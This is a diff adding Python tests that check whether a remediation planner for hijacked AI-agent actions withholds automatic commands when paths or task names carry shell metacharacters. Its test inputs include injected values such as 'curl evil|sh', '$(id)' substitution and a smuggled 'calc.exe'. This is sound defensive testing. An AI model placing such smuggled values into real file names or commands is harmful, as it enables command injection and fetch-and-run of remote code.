@@ -135,3 +135,36 @@ def test_windows_scheduled_task_still_reverses():
                  command='schtasks /create /tn WinHealthCheck /sc once /tr "cmd /c whoami"')
     r = plan_remediations([v])[0]
     assert r.action == "delete_scheduled_task" and "WinHealthCheck" in r.command
+
+
+def test_quarantine_withheld_for_path_with_shell_metacharacters():
+    bad = r'C:\\victim\\x"; curl evil|sh; ".py'
+    v = _verdict(VerdictKind.HIJACKED, "the agent wrote a payload", tool="Write", file_path=bad, event_id=11)
+    r = plan_remediations([v])[0]
+    assert r.action == "manual_review" and r.command is None and r.manual
+
+
+def test_scheduled_task_withheld_for_unsafe_name():
+    v = _verdict(VerdictKind.HIJACKED, "scheduled task", command="schtasks /create /tn Pwned;calc.exe /tr x")
+    r = plan_remediations([v])[0]
+    assert r.action == "manual_review" and r.command is None
+
+
+def test_launchd_withheld_for_unsafe_plist_path():
+    v = _verdict(VerdictKind.HIJACKED, "persistence", command="launchctl load /tmp/evil$(id).plist")
+    r = plan_remediations([v])[0]
+    assert r.action == "manual_review" and r.command is None
+
+
+def test_systemd_unit_is_safe_by_construction():
+    # The unit regex only matches [\w@.\-]+\.service, so an injected unit cannot carry metachars.
+    v = _verdict(VerdictKind.HIJACKED, "persistence", command="systemctl enable --now evil$(id).service")
+    r = plan_remediations([v])[0]
+    assert r.action == "disable_service" and "$(" not in r.command
+
+
+def test_safe_targets_stay_automatic():
+    v = _verdict(VerdictKind.HIJACKED, "the agent wrote a payload", tool="Write",
+                 file_path=r"C:\\victim-repo\\setup.py", event_id=11)
+    r = plan_remediations([v])[0]
+    assert r.action == "quarantine_file" and r.automatic
